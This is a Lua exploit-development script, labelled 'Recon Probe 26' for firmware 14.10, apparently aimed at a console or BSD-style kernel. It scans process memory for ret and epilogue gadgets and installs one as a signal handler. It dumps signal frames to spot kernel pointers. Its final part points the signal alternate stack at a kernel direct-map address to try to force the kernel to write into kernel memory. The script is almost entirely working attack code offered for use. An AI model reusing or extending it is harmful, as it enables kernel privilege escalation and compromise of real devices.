-- 14.10 Recon Probe 26: Find ret gadget for signal handler
-- We need a bare 0xC3 (ret) instruction we can use as a handler
-- The kernel sets sigreturn trampoline as return address, so
-- handler doing just "ret" → sigreturn → clean resume
-- Known code: crash handler at 0x533118f4
-- Scan nearby for 0xC3 bytes

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: GADGET SCAN ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_sigaction = 416,
    sc_sigaltstack = 53,
    sc_kill = 37,
    sc_getpid = 20,
})

local SA_SIZE = 64
local sa_new = memory.alloc(SA_SIZE)
local sa_old = memory.alloc(SA_SIZE)
local ss_new = memory.alloc(32)
local ss_old = memory.alloc(32)
local pid = syscall.sc_getpid():tonumber()

-- ============================================================
-- PART 1: Scan for ret (0xC3) near crash handler
-- ============================================================
log("")
log("--- PART 1: scan near 0x533118f4 ---")

local base = 0x533118f4
local gadgets = {}

-- Scan a window around the crash handler
for offset = -256, 512 do
    local addr = base + offset
    local ok, val = pcall(function()
        return memory.read_byte(addr)
    end)
    if ok then
        local b = val:tonumber()
        if b == 0xC3 then -- ret
            gadgets[#gadgets+1] = addr
            log(string.format("  RET at 0x%x (+%d)", addr, offset))
        end
    end
end
log("  found " .. #gadgets .. " ret gadgets")

-- Also scan for C3 preceded by common patterns:
-- 5D C3 = pop rbp; ret (function epilogue)
-- 90 C3 = nop; ret
-- C9 C3 = leave; ret
log("")
log("--- epilogue patterns ---")
for offset = -256, 512 do
    local addr = base + offset
    local ok1, v1 = pcall(function() return memory.read_byte(addr):tonumber() end)
    local ok2, v2 = pcall(function() return memory.read_byte(addr+1):tonumber() end)
    if ok1 and ok2 and v2 == 0xC3 then
        if v1 == 0x5D then -- pop rbp; ret
            log(string.format("  POP RBP; RET at 0x%x", addr))
        elseif v1 == 0xC9 then -- leave; ret
            log(string.format("  LEAVE; RET at 0x%x", addr))
        end
    end
end

-- ============================================================
-- PART 2: Scan more broadly — look at low addresses too
-- The Lua loader base might be at a predictable address
-- ============================================================
log("")
log("--- PART 2: broader scan ---")

-- Try scanning from the start of what might be the text segment
-- 0x533118f4 suggests base around 0x53000000 or similar
-- Scan function prologues: 55 48 89 E5 = push rbp; mov rbp, rsp
local scan_bases = {0x53310000, 0x53311000, 0x53312000, 0x53300000}
for _, sb in ipairs(scan_bases) do
    local ret_count = 0
    local first_ret = nil
    for i = 0, 4095 do
        local ok, val = pcall(function() return memory.read_byte(sb + i):tonumber() end)
        if ok and val == 0xC3 then
            ret_count = ret_count + 1
            if not first_ret then first_ret = sb + i end
        end
    end
    if ret_count > 0 then
        log(string.format("  0x%x: %d rets, first at 0x%x", sb, ret_count, first_ret))
    end
end

-- ============================================================
-- PART 3: Test first ret gadget as signal handler
-- Use SIGUSR1 with user altstack, check clean return
-- ============================================================
log("")
log("--- PART 3: test ret gadget ---")

if #gadgets == 0 then
    log("  no gadgets found, skipping")
else
    local gadget = gadgets[1]
    log(string.format("  testing gadget at 0x%x", gadget))

    -- Set up user altstack with pattern
    local STACK_SZ = 32768
    local test_stack = memory.alloc(STACK_SZ)
    for i = 0, STACK_SZ - 4, 4 do
        memory.write_dword(test_stack + i, 0x33330000 + i)
    end

    memory.write_qword(ss_new, test_stack)
    memory.write_qword(ss_new + 8, STACK_SZ)
    memory.write_dword(ss_new + 16, 0)
    pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

    -- Set handler to ret gadget with SA_ONSTACK|SA_SIGINFO
    for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
    -- Write address as lo/hi dwords
    local g_lo = gadget % 0x100000000
    local g_hi = math.floor(gadget / 0x100000000)
    memory.write_dword(sa_new, g_lo)
    memory.write_dword(sa_new + 4, g_hi)
    memory.write_dword(sa_new + 8, 0x0001 + 0x0040) -- SA_ONSTACK|SA_SIGINFO
    pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)

    -- Send SIGUSR1
    log("  sending SIGUSR1...")
    local k_ok, k_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
    log("  kill rv=" .. (k_ok and tostring(k_ret:tonumber()) or "ERR"))

    local alive = pcall(function() return syscall.sc_getpid() end)
    log("  alive after signal: " .. tostring(alive))

    if alive then
        -- Check altstack modification
        local modified = 0
        local first_mod = -1
        for i = 0, STACK_SZ - 4, 4 do
            local v = memory.read_dword(test_stack + i):tonumber()
            if v ~= 0x33330000 + i then
                modified = modified + 1
                if first_mod < 0 then first_mod = i end
            end
        end
        log("  altstack modified dwords: " .. modified)
        if first_mod >= 0 then
            log("  first modification at offset: " .. first_mod)
            -- Dump signal frame
            log("  signal frame dump:")
            for i = first_mod, math.min(first_mod + 512, STACK_SZ - 4), 8 do
                local lo = memory.read_dword(test_stack + i):tonumber()
                local hi = memory.read_dword(test_stack + i + 4):tonumber()
                local orig_lo = (0x33330000 + i) % 0x100000000
                local orig_hi = (0x33330000 + i + 4) % 0x100000000
                if lo ~= orig_lo or hi ~= orig_hi then
                    local tag = ""
                    if hi >= 0xFFFF0000 then tag = " ***KPTR***" end
                    log(string.format("    +%04x: 0x%08x%08x%s", i, hi, lo, tag))
                end
            end
        end

        -- Disable altstack
        memory.write_dword(ss_new + 16, 4) -- SS_DISABLE
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)

        -- ============================================================
        -- PART 4: Kernel altstack with ret gadget handler
        -- THE REAL EXPLOIT TEST
        -- ============================================================
        log("")
        log("--- PART 4: KERNEL ALTSTACK + RET GADGET ---")

        -- Set kernel DMAP altstack
        memory.write_dword(ss_new, 0x10000000)
        memory.write_dword(ss_new + 4, 0xFFFFF800)
        memory.write_qword(ss_new + 8, STACK_SZ)
        memory.write_dword(ss_new + 16, 0)
        local kss = pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
        log("  set kernel altstack: " .. tostring(kss))

        -- Handler still set to ret gadget + SA_ONSTACK
        -- Send SIGUSR1 — kernel will try to build signal frame
        -- at DMAP address via copyout()
        log("  sending SIGUSR1 with kernel altstack...")
        local k2_ok, k2_ret = pcall(function() return syscall.sc_kill(pid, 30) end)
        log("  kill rv=" .. (k2_ok and tostring(k2_ret:tonumber()) or "ERR"))

        local alive2 = pcall(function() return syscall.sc_getpid() end)
        log("  alive: " .. tostring(alive2))

        -- If we survived: either copyout() returned EFAULT (kernel validated)
        -- or the kernel actually wrote to kernel memory (!!!)
        -- Either way, this is a critical result

        -- Disable altstack
        memory.write_dword(ss_new + 16, 4)
        pcall(function() syscall.sc_sigaltstack(ss_new, ss_old) end)
    end

    -- Restore handler
    for i = 0, SA_SIZE - 1, 8 do memory.write_qword(sa_new + i, 0) end
    pcall(function() syscall.sc_sigaction(30, sa_new, sa_old) end)
end

log("")
log("=== GADGET SCAN DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
